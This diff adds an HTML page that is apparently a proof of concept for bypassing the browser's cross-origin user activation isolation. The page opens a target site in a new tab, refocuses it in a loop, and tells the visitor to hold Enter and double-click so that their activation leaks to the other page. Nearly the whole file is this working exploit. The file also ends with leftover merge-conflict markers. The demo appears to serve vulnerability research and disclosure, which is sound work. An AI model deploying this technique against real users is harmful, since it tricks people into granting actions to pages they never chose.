@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+
+<body style="background: #fff5f5; font-family: sans-serif; text-align: center; padding: 50px;">
+
+    <button id="main-exploit-btn"
+        style="margin-top: 30px; padding: 5px 5px; font-size: 24px; cursor: pointer; background: #ff4444; color: white; border: none; border-radius: 12px; font-weight: bold; transition: all 0.3s ease;">
+        click and hold 2s
+    </button>
+
+    <div id="instruction-box"
+        style="margin-top: 30px; border: 2px dashed #ff4444; padding: 20px; background: white; max-width: 500px; margin-left: auto; margin-right: auto;">
+        <p id="step-text"><b>Step 1:</b> Click and <b>HOLD "Enter"</b> on the red button above.</p>
+    </div>
+
+    <script>
+        const targetURL = "https://cape-poc.vercel.app/";
+        const mainBtn = document.getElementById('main-exploit-btn');
+        const stepText = document.getElementById('step-text');
+        let opened = false;
+        let victim = null;
+        document.addEventListener("keydown", (event) => {
+            if (event.key !== "Enter") return;
+            if (event.repeat || opened) return;
+
+            opened = true;
+            console.log("[*] Stage 1: Opening target tab...");
+            victim = window.open(targetURL, "_blank");
+
+            mainBtn.innerText = "button";
+            mainBtn.style.background = "#444";
+            stepText.innerHTML = "<b>Step 2:</b> Now, <b>Double Click</b> the button while still holding/pressing Enter.";
+
+            const focusInterval = setInterval(() => {
+                if (!victim || victim.closed) {
+                    clearInterval(focusInterval);
+                    resetUI();
+                    return;
+                }
+                try {
+                    victim.focus();
+                } catch (e) { }
+            }, 100);
+        });
+
+        mainBtn.addEventListener('dblclick', () => {
+            if (opened && victim) {
+                console.log("[*] Stage 2: Double-click detected. Leaking activation!");
+                victim.focus();
+            }
+        });
+
+        function resetUI() {
+            opened = false;
+            mainBtn.innerText = "Bypass of Cross-Origin User Activation Isolation";
+            mainBtn.style.background = "#ff4444";
+            stepText.innerHTML = "<b>Step 1:</b> Click and <b>HOLD \"Enter\"</b> on the red button above.";
+        }
+    </script>
+</body>
+
+<<<<<<< HEAD
+</html>
+=======
+</html>
+>>>>>>> 8bdd8a6a09f2cad8b40d623fd301fe3630642267
